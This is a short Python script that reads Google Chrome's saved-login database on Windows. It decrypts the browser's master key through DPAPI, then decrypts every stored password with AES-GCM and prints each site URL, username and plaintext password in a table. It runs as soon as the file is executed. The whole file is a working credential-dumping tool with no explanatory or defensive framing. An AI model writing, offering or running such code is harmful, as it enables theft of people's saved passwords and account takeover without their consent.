import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from prettytable import PrettyTable

def getpass():
    userdata = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    db = os.path.join(userdata, "default", "Login Data")
    localstate = os.path.join(userdata, "Local State")

    with open(localstate, "r", encoding="utf-8") as f:
        encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    with sqlite3.connect(db) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()
    
    table = PrettyTable()
    table.field_names = ["Origin URL", "Username", "Password"]
    table.align["Origin URL"] = "l"
    table.align["Username"] = "l"
    table.align["Password"] = "l"

    for origin_url, username, encrypted_password in logins:
        try:
            vector, password = encrypted_password[3:15], encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, vector)
            password = cipher.decrypt(password)[:-16].decode()
        except Exception:
            password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        if username and password:
            table.add_row([origin_url, username, password])

    print(table)

getpass()
